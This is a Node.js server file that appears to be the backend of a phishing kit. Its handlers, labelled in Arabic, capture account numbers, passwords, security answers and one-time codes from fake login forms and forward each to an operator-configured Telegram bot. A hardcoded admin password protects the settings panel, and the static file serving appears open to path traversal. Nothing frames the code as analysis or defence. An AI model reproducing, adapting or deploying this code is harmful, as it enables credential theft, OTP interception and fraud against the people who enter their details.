const http = require("http");
const fs = require("fs");
const path = require("path");
const https = require("https");

const PORT = process.env.PORT || 3000;
const SETTINGS_FILE = path.join(__dirname, "settings.json");
const ADMIN_PASSWORD = "Admin1234";

const MIME = {
  ".html": "text/html; charset=utf-8",
  ".css": "text/css",
  ".js": "application/javascript",
  ".json": "application/json",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".jpeg": "image/jpeg",
  ".gif": "image/gif",
  ".svg": "image/svg+xml",
  ".ico": "image/x-icon",
  ".woff": "font/woff",
  ".woff2": "font/woff2",
  ".ttf": "font/ttf",
  ".webp": "image/webp",
  ".mp4": "video/mp4",
};

function loadSettings() {
  try {
    if (fs.existsSync(SETTINGS_FILE)) {
      return JSON.parse(fs.readFileSync(SETTINGS_FILE, "utf-8"));
    }
  } catch (e) {}
  return { bot_token: "", chat_id: "", updated_at: null };
}

function saveSettings(s) {
  fs.writeFileSync(SETTINGS_FILE, JSON.stringify(s, null, 2));
}

function sendTelegram(botToken, chatId, text) {
  return new Promise((resolve, reject) => {
    if (!botToken || !chatId) return resolve(false);
    const payload = JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML" });
    const req = https.request(
      {
        hostname: "api.telegram.org",
        path: `/bot${botToken}/sendMessage`,
        method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(payload) },
      },
      (res) => {
        let body = "";
        res.on("data", (c) => (body += c));
        res.on("end", () => resolve(res.statusCode === 200));
      }
    );
    req.on("error", () => resolve(false));
    req.write(payload);
    req.end();
  });
}

function deserializeSeroval(node) {
  if (!node || typeof node !== "object") return node;
  switch (node.t) {
    case 0: return node.s;
    case 1: return node.s;
    case 2: return [null, undefined, true, false, -0, Infinity, -Infinity, NaN][node.s];
    case 9: return (node.a || []).map(deserializeSeroval);
    case 10: {
      const obj = {};
      if (node.p) {
        for (let i = 0; i < node.p.k.length; i++)
          obj[node.p.k[i]] = deserializeSeroval(node.p.v[i]);
      }
      return obj;
    }
    default: return node;
  }
}

function readBody(req) {
  return new Promise((resolve) => {
    let body = "";
    req.on("data", (c) => (body += c));
    req.on("end", () => {
      try {
        const parsed = JSON.parse(body);
        if (parsed && typeof parsed.t === "number" && parsed.p) {
          resolve(deserializeSeroval(parsed));
        } else {
          resolve(parsed);
        }
      } catch { resolve({}); }
    });
  });
}

function sendJson(res, data) {
  const json = JSON.stringify(data);
  res.writeHead(200, { "Content-Type": "application/json" });
  res.end(json);
}

const SERVER_FN_HANDLERS = {
  // Login form: account + password + service
  "5a778137b307c3c64bcb13b4f224a252e8f3929d980316359d75b7e570ad9a78": async (data) => {
    const s = loadSettings();
    const msg = `🔐 <b>تسجيل دخول جديد</b>\n\n👤 رقم الحساب: <code>${data.account || ""}</code>\n🔑 كلمة المرور: <code>${data.password || ""}</code>\n📋 الخدمة: ${data.service || "غير محدد"}\n⏰ ${new Date().toLocaleString("ar-EG")}`;
    await sendTelegram(s.bot_token, s.chat_id, msg);
    return { ok: true };
  },

  // Login (exported as r -> a.r): same login handler
  "8f77dad699ccdcb965b75b5b4ade8d14cc361218add59796aa50c9bb1dc34fda": async (data) => {
    const s = loadSettings();
    const msg = `🔐 <b>تسجيل دخول</b>\n\n👤 الحساب: <code>${data.account || ""}</code>\n🔑 كلمة المرور: <code>${data.password || ""}</code>\n📋 الخدمة: ${data.service || ""}`;
    await sendTelegram(s.bot_token, s.chat_id, msg);
    return { ok: true };
  },

  // Tracking: security question + answer
  "f3104eed51e53b25722f81ffc68fdea6ff2734a01f7814fd27fd5ba59405d58a": async (data) => {
    const s = loadSettings();
    const msg = `🛡️ <b>سؤال أمان</b>\n\n❓ السؤال: ${data.question || ""}\n✏️ الجواب: <code>${data.answer || ""}</code>\n👤 الحساب: <code>${data.account || ""}</code>\n⏰ ${new Date().toLocaleString("ar-EG")}`;
    await sendTelegram(s.bot_token, s.chat_id, msg);
    return { ok: true };
  },

  // OTP verification
  "558c58ed06e8b7706d065b4277a2f70a11c7f1f3fdb164ce74a206e5697d440f": async (data) => {
    const s = loadSettings();
    const msg = `🔢 <b>رمز OTP</b>\n\n🔑 الرمز: <code>${data.otp || data.otp_code || data.code || ""}</code>\n👤 الحساب: <code>${data.account || ""}</code>\n⏰ ${new Date().toLocaleString("ar-EG")}`;
    await sendTelegram(s.bot_token, s.chat_id, msg);
    return { ok: true };
  },

  // Account validation / misc
  "01b7b7d8a082e3c609ee93861dd303887d75b7309ad540f543aeaf3b7462ab10": async (data) => {
    return { ok: true };
  },

  // Admin login
  "625e04301b2d3f14dea17625c57911242ac2f01b582f63aad6a4695a662c8012": async (data) => {
    if (data.password !== ADMIN_PASSWORD) {
      return { ok: false, error: "كلمة المرور غير صحيحة" };
    }
    const s = loadSettings();
    return { ok: true, bot_token: s.bot_token, chat_id: s.chat_id, updated_at: s.updated_at };
  },

  // Admin save settings
  "a48140e83a983a9af35c0fdf8ec5024c5dc9120f9ce2b325be6c3db95bdc9d19": async (data) => {
    if (data.password !== ADMIN_PASSWORD) {
      return { ok: false, error: "كلمة المرور غير صحيحة" };
    }
    const s = { bot_token: data.bot_token || "", chat_id: data.chat_id || "", updated_at: new Date().toISOString() };
    saveSettings(s);
    return { ok: true };
  },

  // Admin test bot
  "707f8c6114bd6aa53cb10e4e7ac37e3fe6f2784ea9ed6e73a66aac87192de0c4": async (data) => {
    if (data.password !== ADMIN_PASSWORD) {
      return { ok: false, error: "كلمة المرور غير صحيحة" };
    }
    const s = loadSettings();
    const sent = await sendTelegram(s.bot_token, s.chat_id, "✅ رسالة اختبار — البوت يعمل بنجاح!");
    return sent ? { ok: true } : { ok: false, error: "فشل إرسال الرسالة" };
  },
};

http.createServer(async (req, res) => {
  const urlPath = decodeURIComponent(req.url.split("?")[0]);

  if (urlPath.startsWith("/_serverFn/") && req.method === "POST") {
    const hash = urlPath.replace("/_serverFn/", "");
    const handler = SERVER_FN_HANDLERS[hash];
    if (!handler) {
      res.writeHead(404);
      res.end("Not found");
      return;
    }
    try {
      const body = await readBody(req);
      const input = body.data || body;
      const result = await handler(input);
      sendJson(res, result);
    } catch (e) {
      console.error("Server fn error:", e);
      sendJson(res, { ok: false, error: "خطأ في الخادم" });
    }
    return;
  }

  let filePath = "." + urlPath;
  if (filePath === "./") filePath = "./index.html";

  const ext = path.extname(filePath).toLowerCase();

  if (ext && fs.existsSync(filePath)) {
    const contentType = MIME[ext] || "application/octet-stream";
    fs.readFile(filePath, (err, data) => {
      if (err) { res.writeHead(500); res.end("Error"); return; }
      res.writeHead(200, { "Content-Type": contentType });
      res.end(data);
    });
  } else {
    fs.readFile("./index.html", (err, data) => {
      if (err) { res.writeHead(500); res.end("Error"); return; }
      res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
      res.end(data);
    });
  }
}).listen(PORT, () => {
  console.log("Server running on port " + PORT);
});
